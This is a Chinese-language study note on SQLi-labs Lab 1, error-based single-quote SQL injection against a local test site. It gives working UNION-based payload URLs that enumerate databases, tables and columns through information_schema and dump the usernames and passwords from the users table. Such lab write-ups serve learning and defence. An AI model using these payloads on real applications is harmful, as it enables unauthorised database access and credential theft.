## Lab1 -- GET Error based single quotes

+ 第一题可能是最挑战的把，毕竟从0到1，好好记笔记
+ 输入?id=1'发现报错 -- 存在SQL注入

```
报错：
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

+ 猜测语句

```
有效判断语句为
'1'' LIMIT 0,1
猜测
select * from table where id = 'id' LIMIT 0,1
```



+ 利用order by确定这张表中的字段数
+ 于是在注入的地方使其报错，然后注入自己想要的语句，在把后面的limit 0,1给注释掉

```mysql

1' order by 3 --+ //得到列数为3， --+是为了注释后面的语句

//1. 先利用union语句查询哪些是可以显示在网页上的
1' union select 1,2,3#//发现第二个和第三个才会显示到网页上
//所以让第一行查询的结果为空，union右边的查询结果就自然成为了第一行


//因为能显示的位置只有2个，远远不够，所以我们需要用到concat()个concat_ws()函数
select concat_ws(':',1,2,3)//结果为1:2:3
concat_ws第一个参数相当于分隔符，然而一般我们需要把第一个参数用mysql的char函数将十进制ASCII码转换成字符，不然会被h	tml编码，这里熟练使用以下语句即可！
select concat_ws(char(32,58,32),user(),database(),version())//user返回当前数据库连接用户，database()返回当前数据库使用的数据库，version()返回当前数据库的版本

http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())#
-->2. 返回当前用户，数据库及其版本

http://127.0.0.1/sqli/Less-1/?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata#
-->3. 返回当前数据库的所有数据库名

http://127.0.0.1/sqli/Less-1/?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'#
注意security数据库名需要用单引号引起来
或者
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#
区别在于'security'变成了十六进制
-->4. 获取当前数据库中的所有表

http://127.0.0.1/sqli/Less-1/?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'#
-->5. 获取需要的表中的id名字

http://127.0.0.1/sqli/Less-1/?id=0' union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from security.users#
-->6. 获取user表中的3个字段
```

+ group_concat的作用：把一列列显示的名字变成一行
+ union的作用：连接多个select语句，有重复的会删除

